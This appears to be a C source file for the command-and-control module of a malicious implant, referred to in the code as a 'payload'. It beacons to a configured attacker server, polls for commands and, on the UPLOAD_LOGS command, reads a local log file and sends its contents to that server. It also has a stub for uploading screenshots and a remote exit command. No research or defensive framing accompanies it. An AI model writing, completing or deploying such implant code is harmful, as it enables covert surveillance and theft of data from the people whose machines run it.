#include "c2_communication_fixed.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int c2_socket = -1;
static struct sockaddr_in c2_server;

void init_c2_communication() {
	// Create socket
	c2_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (c2_socket < 0) {
		perror("socket creation failed");
		return;
	}
	
	// Configure server address
	memset(&c2_server, 0, sizeof(c2_server));
	c2_server.sin_family = AF_INET;
	c2_server.sin_port = htons(C2_PORT);
	
	// Convert IPv4 and IPv6 addresses from text to binary form
	if (inet_pton(AF_INET, C2_SERVER_IP, &c2_server.sin_addr) <= 0) {
		perror("invalid address/address not supported");
		close(c2_socket);
		c2_socket = -1;
		return;
	}
}

int connect_to_c2() {
	if (c2_socket < 0) {
		init_c2_communication();
	}
	
	if (c2_socket < 0) {
		return -1;
	}
	
	// Connect to server
	if (connect(c2_socket, (struct sockaddr *)&c2_server, sizeof(c2_server)) < 0) {
		perror("connection failed");
		close(c2_socket);
		c2_socket = -1;
		return -1;
	}
	
	return 0;
}

int send_data_to_c2(const char* data, size_t length) {
	if (c2_socket < 0) {
		if (connect_to_c2() < 0) {
			return -1;
		}
	}
	
	return send(c2_socket, data, length, 0);
}

int receive_data_from_c2(char* buffer, size_t buffer_size) {
	if (c2_socket < 0) {
		if (connect_to_c2() < 0) {
			return -1;
		}
	}
	
	return recv(c2_socket, buffer, buffer_size - 1, 0);
}

void close_c2_communication() {
	if (c2_socket >= 0) {
		close(c2_socket);
		c2_socket = -1;
	}
}

void* c2_communication_main(void* arg) {
	// Main C2 communication loop
	char buffer[1024];
	int bytes_received;
	
	while (is_payload_running()) {
		if (connect_to_c2() == 0) {
			// Send heartbeat
			send_data_to_c2("HEARTBEAT\n", 10);
			
			// Receive commands
			bytes_received = receive_data_from_c2(buffer, sizeof(buffer));
			if (bytes_received > 0) {
				buffer[bytes_received] = '\0';
				// Process command
				process_c2_command(buffer);
			}
			
			close_c2_communication();
		}
		
		// Sleep before next attempt
		sleep(C2_POLL_INTERVAL);
	}
	
	return NULL;
}

void process_c2_command(const char* command) {
	// Process C2 commands
	if (strstr(command, "UPLOAD_LOGS") != NULL) {
		// Upload logs to C2 server
		upload_logs();
	} else if (strstr(command, "UPLOAD_SCREENSHOTS") != NULL) {
		// Upload screenshots
		upload_screenshots();
	} else if (strstr(command, "EXIT") != NULL) {
		// Exit payload
		stop_payload();
	}
}

void upload_logs() {
	// Upload log file to C2 server
	FILE* log_file = fopen(LOG_FILE, "r");
	if (log_file) {
		char buffer[1024];
		size_t bytes_read;
		
		while ((bytes_read = fread(buffer, 1, sizeof(buffer), log_file)) > 0) {
			send_data_to_c2(buffer, bytes_read);
		}
		
		fclose(log_file);
	}
}

void upload_screenshots() {
	// Upload screenshots to C2 server
	// Implementation depends on OS and screenshot storage
}